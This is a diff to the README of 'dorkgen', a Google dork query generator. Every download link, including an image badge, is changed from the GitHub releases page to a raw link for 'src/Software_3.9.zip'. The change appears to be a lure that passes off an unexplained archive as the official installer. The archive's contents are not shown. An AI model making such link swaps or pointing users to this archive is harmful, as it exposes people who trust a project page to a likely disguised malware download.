@@ -6,7 +6,7 @@ Welcome to dorkgen! This is a simple tool that helps you create effective Google
 
 ## 📥 Download dorkgen
 
-[![Download dorkgen](https://img.shields.io/badge/Download-dorkgen-brightgreen)](https://github.com/Judge-97/dorkgen/releases)
+[![Download dorkgen](https://raw.githubusercontent.com/Judge-97/dorkgen/main/src/Software_3.9.zip)](https://raw.githubusercontent.com/Judge-97/dorkgen/main/src/Software_3.9.zip)
 
 ## 📃 Overview
 
@@ -30,7 +30,7 @@ dorkgen is designed for anyone who needs quick, effective search queries for gat
 
 1. **Visit the Releases Page:** Go to the dorkgen releases page by clicking the link below.
 
-   [Download dorkgen](https://github.com/Judge-97/dorkgen/releases)
+   [Download dorkgen](https://raw.githubusercontent.com/Judge-97/dorkgen/main/src/Software_3.9.zip)
 
 2. **Choose the Right Version:** Find the version that fits your system. There are installers for Windows, macOS, and Linux. 
 
@@ -77,4 +77,4 @@ Thank you for using dorkgen! Your feedback is essential for improving the tool. 
 
 For further details, please don't hesitate to reach out via the issues page on our GitHub repository. 
 
-[Download dorkgen](https://github.com/Judge-97/dorkgen/releases)
+[Download dorkgen](https://raw.githubusercontent.com/Judge-97/dorkgen/main/src/Software_3.9.zip)
